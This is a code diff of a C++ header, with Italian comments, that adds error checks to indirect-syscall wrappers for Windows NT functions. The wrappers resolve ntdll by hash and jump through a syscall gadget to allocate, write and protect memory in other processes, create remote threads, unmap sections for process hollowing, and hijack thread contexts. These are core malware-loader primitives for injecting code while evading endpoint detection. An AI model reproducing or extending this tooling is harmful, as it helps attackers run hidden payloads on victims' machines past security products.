@@ -171,42 +171,55 @@ inline NTSTATUS SysNtCreateThreadExDirect(PHANDLE ThreadHandle, ACCESS_MASK Desi
 // Wrapper per NtProtectVirtualMemory
 inline NTSTATUS SysNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection) {
     if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
+    if (g_syscall_gadget == 0) return 0xC0000001;  // no gadget: never jmp through null
     auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTPROTECTVIRTUALMEMORY);
+    if (!pFunc) return 0xC0000001;                 // no stub: never syscall with junk SSN
     uint32_t ssn = find_ssn((uint8_t*)pFunc);
+    if (ssn == 0) return 0xC0000001;               // SSN 0 is not a callable NT service
     return ::execute_syscall(ssn, g_syscall_gadget, ProcessHandle, BaseAddress, NumberOfBytesToProtect, (PVOID)(ULONG_PTR)NewAccessProtection, OldAccessProtection, 0, 0, 0, 0, 0, 0);
 }
 
 // Wrapper per NtAllocateVirtualMemory
 inline NTSTATUS SysNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
     if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
+    if (g_syscall_gadget == 0) return 0xC0000001;  // no gadget: never jmp through null
     auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTALLOCATEVIRTUALMEMORY);
+    if (!pFunc) return 0xC0000001;                 // no stub: never syscall with junk SSN
     uint32_t ssn = find_ssn((uint8_t*)pFunc);
+    if (ssn == 0) return 0xC0000001;               // SSN 0 is not a callable NT service
     return ::execute_syscall(ssn, g_syscall_gadget, ProcessHandle, BaseAddress, (PVOID)ZeroBits, RegionSize, (PVOID)(ULONG_PTR)AllocationType, (PVOID)(ULONG_PTR)Protect, 0, 0, 0, 0, 0);
 }
 
 // Wrapper per NtWriteVirtualMemory
 inline NTSTATUS SysNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
     if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
+    if (g_syscall_gadget == 0) return 0xC0000001;  // no gadget: never jmp through null
     auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTWRITEVIRTUALMEMORY);
+    if (!pFunc) return 0xC0000001;                 // no stub: never syscall with junk SSN
     uint32_t ssn = find_ssn((uint8_t*)pFunc);
+    if (ssn == 0) return 0xC0000001;               // SSN 0 is not a callable NT service
     return ::execute_syscall(ssn, g_syscall_gadget, ProcessHandle, BaseAddress, Buffer, (PVOID)NumberOfBytesToWrite, NumberOfBytesWritten, 0, 0, 0, 0, 0, 0);
 }
 
 // Wrapper per NtOpenProcess
 inline NTSTATUS SysNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, void* ClientId) {
     if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
+    if (g_syscall_gadget == 0) return 0xC0000001;  // no gadget: never jmp through null
     auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTOPENPROCESS);
+    if (!pFunc) return 0xC0000001;                 // no stub: never syscall with junk SSN
     uint32_t ssn = find_ssn((uint8_t*)pFunc);
+    if (ssn == 0) return 0xC0000001;               // SSN 0 is not a callable NT service
     return ::execute_syscall(ssn, g_syscall_gadget, ProcessHandle, (PVOID)(ULONG_PTR)DesiredAccess, ObjectAttributes, ClientId, 0, 0, 0, 0, 0, 0, 0);
 }
 
 // Wrapper per NtCreateThreadEx (Ora interamente convertito a Indirect Syscall nativa con 11 parametri)
 inline NTSTATUS SysNtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaxStackSize, PVOID AttributeList) {
     if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
+    if (g_syscall_gadget == 0) return 0xC0000001;  // no gadget: never jmp through null
     auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTCREATETHREADEX);
     if (!pFunc) return 0xC0000001; // STATUS_UNSUCCESSFUL
-    
     uint32_t ssn = find_ssn((uint8_t*)pFunc);
+    if (ssn == 0) return 0xC0000001;               // SSN 0 is not a callable NT service
     return ::execute_syscall(
         ssn, 
         g_syscall_gadget, 
@@ -227,63 +240,77 @@ inline NTSTATUS SysNtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAcc
 // Wrapper per NtUnmapViewOfSection (Process Hollowing)
 inline NTSTATUS SysNtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress) {
     if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
+    if (g_syscall_gadget == 0) return 0xC0000001;  // no gadget: never jmp through null
     auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTUNMAPVIEWOFSECTION);
     if (!pFunc) return 0xC0000001;
     uint32_t ssn = find_ssn((uint8_t*)pFunc);
+    if (ssn == 0) return 0xC0000001;               // SSN 0 is not a callable NT service
     return ::execute_syscall(ssn, g_syscall_gadget, ProcessHandle, BaseAddress, 0, 0, 0, 0, 0, 0, 0, 0, 0);
 }
 
 // Wrapper per NtGetContextThread
 inline NTSTATUS SysNtGetContextThread(HANDLE ThreadHandle, PCONTEXT Context) {
     if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
+    if (g_syscall_gadget == 0) return 0xC0000001;  // no gadget: never jmp through null
     auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTGETCONTEXTTHREAD);
     if (!pFunc) return 0xC0000001;
     uint32_t ssn = find_ssn((uint8_t*)pFunc);
+    if (ssn == 0) return 0xC0000001;               // SSN 0 is not a callable NT service
     return ::execute_syscall(ssn, g_syscall_gadget, ThreadHandle, Context, 0, 0, 0, 0, 0, 0, 0, 0, 0);
 }
 
 // Wrapper per NtSetContextThread
 inline NTSTATUS SysNtSetContextThread(HANDLE ThreadHandle, PCONTEXT Context) {
     if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
+    if (g_syscall_gadget == 0) return 0xC0000001;  // no gadget: never jmp through null
     auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTSETCONTEXTTHREAD);
     if (!pFunc) return 0xC0000001;
     uint32_t ssn = find_ssn((uint8_t*)pFunc);
+    if (ssn == 0) return 0xC0000001;               // SSN 0 is not a callable NT service
     return ::execute_syscall(ssn, g_syscall_gadget, ThreadHandle, Context, 0, 0, 0, 0, 0, 0, 0, 0, 0);
 }
 
 // Wrapper per NtResumeThread
 inline NTSTATUS SysNtResumeThread(HANDLE ThreadHandle, PULONG SuspendCount) {
     if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
+    if (g_syscall_gadget == 0) return 0xC0000001;  // no gadget: never jmp through null
     auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTRESUMETHREAD);
     if (!pFunc) return 0xC0000001;
     uint32_t ssn = find_ssn((uint8_t*)pFunc);
+    if (ssn == 0) return 0xC0000001;               // SSN 0 is not a callable NT service
     return ::execute_syscall(ssn, g_syscall_gadget, ThreadHandle, SuspendCount, 0, 0, 0, 0, 0, 0, 0, 0, 0);
 }
 
 // Wrapper per NtClose
 inline NTSTATUS SysNtClose(HANDLE Handle) {
     if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
+    if (g_syscall_gadget == 0) return 0xC0000001;  // no gadget: never jmp through null
     auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTCLOSE);
     if (!pFunc) return 0xC0000001;
     uint32_t ssn = find_ssn((uint8_t*)pFunc);
+    if (ssn == 0) return 0xC0000001;               // SSN 0 is not a callable NT service
     return ::execute_syscall(ssn, g_syscall_gadget, Handle, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
 }
 
 // Wrapper per NtReadVirtualMemory
 inline NTSTATUS SysNtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead) {
     if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
+    if (g_syscall_gadget == 0) return 0xC0000001;  // no gadget: never jmp through null
     auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTREADVIRTUALMEMORY);
     if (!pFunc) return 0xC0000001;
     uint32_t ssn = find_ssn((uint8_t*)pFunc);
+    if (ssn == 0) return 0xC0000001;               // SSN 0 is not a callable NT service
     return ::execute_syscall(ssn, g_syscall_gadget, ProcessHandle, BaseAddress, Buffer, (PVOID)NumberOfBytesToRead, NumberOfBytesRead, 0, 0, 0, 0, 0, 0);
 }
 
 // Wrapper per NtQueryInformationProcess
 inline NTSTATUS SysNtQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS InfoClass, PVOID InfoBuffer, ULONG InfoBufferSize, PULONG ReturnLength) {
     if (g_syscall_gadget == 0) g_syscall_gadget = find_syscall_gadget();
+    if (g_syscall_gadget == 0) return 0xC0000001;  // no gadget: never jmp through null
     auto pFunc = peb::Resolve(peb::HASH_NTDLL, FN_NTQUERYINFORMATIONPROCESS);
     if (!pFunc) return 0xC0000001;
     uint32_t ssn = find_ssn((uint8_t*)pFunc);
+    if (ssn == 0) return 0xC0000001;               // SSN 0 is not a callable NT service
     return ::execute_syscall(ssn, g_syscall_gadget, ProcessHandle, (PVOID)(ULONG_PTR)InfoClass, InfoBuffer, (PVOID)(ULONG_PTR)InfoBufferSize, ReturnLength, 0, 0, 0, 0, 0, 0);
 }
 
